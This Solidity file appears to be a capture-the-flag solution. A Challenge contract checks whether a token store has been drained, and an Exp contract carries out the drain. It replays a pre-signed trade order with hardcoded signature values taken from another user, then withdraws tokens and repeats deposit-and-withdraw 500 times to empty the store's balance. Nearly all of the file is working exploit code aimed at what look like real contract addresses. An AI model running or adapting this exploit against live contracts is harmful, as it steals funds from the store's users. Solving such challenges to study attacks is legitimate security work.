pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console} from "forge-std/console.sol";

contract Challenge {
    IERC20 private immutable TOKEN = IERC20(0xC937f5027D47250Fa2Df8CbF21F6F88E98817845);

    address private immutable TOKENSTORE = 0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8;

    uint256 private immutable INITIAL_BALANCE;

    constructor() {
        INITIAL_BALANCE = TOKEN.balanceOf(TOKENSTORE);
    }

    function isSolved() external view returns (bool) {
        return INITIAL_BALANCE - TOKEN.balanceOf(TOKENSTORE) >= 11111e8;
    }
}

interface TokenStore {
  function trade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,
      uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount) external;

  function deposit() external payable;
  function withdrawToken(address _token, uint _amount) external;
  function depositToken(address _token, uint _amount) external;
  function tokens(address addr, address token) external view returns(uint256);
}

contract Exp {
  TokenStore public store = TokenStore(0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8);
  uint256 balanceBefore;
  
  function run() public payable {
    require(msg.value == 100 ether, "Value not enough");

    address target = 0xC937f5027D47250Fa2Df8CbF21F6F88E98817845;

    store.deposit{value: 100 ether}();
    store.trade(
      0x0000000000000000000000000000000000000000,
      42468000000000000,
      0xC937f5027D47250Fa2Df8CbF21F6F88E98817845,
      1000000000000,
      109997981,
      249363390,
      0x6FFacaa9A9c6f8e7CD7D1C6830f9bc2a146cF10C,
      28,
      bytes32(0x2b80ada8a8d94ed393723df8d1b802e1f05e623830cf117e326b30b1780ae397),
      bytes32(0x65397616af0ec4d25f828b25497c697c58b3dcc852259eaf7c72ff487ce76e1e),
      31111e12
    );

    balanceBefore = IERC20(target).balanceOf(address(store));
    console.log(balanceBefore);
    console.log(store.tokens(target, address(this)));
    store.withdrawToken(target, 7000e8);

    IERC20(target).approve(address(store), 1e50);
    uint256 targetBalance = IERC20(target).balanceOf(address(this));
    uint256 balanceAfter = IERC20(target).balanceOf(address(store));

    console.log(balanceBefore - balanceAfter);
  }

  function run2() public {
    address target = 0xC937f5027D47250Fa2Df8CbF21F6F88E98817845;
    uint256 targetBalance = IERC20(target).balanceOf(address(this));
    for (uint256 i = 0; i < 500; i++) {
      store.depositToken(target, targetBalance);
      store.withdrawToken(target, targetBalance);
    }
    uint256 balanceAfter = IERC20(target).balanceOf(address(store));

    console.log(balanceBefore - balanceAfter);
  }
}
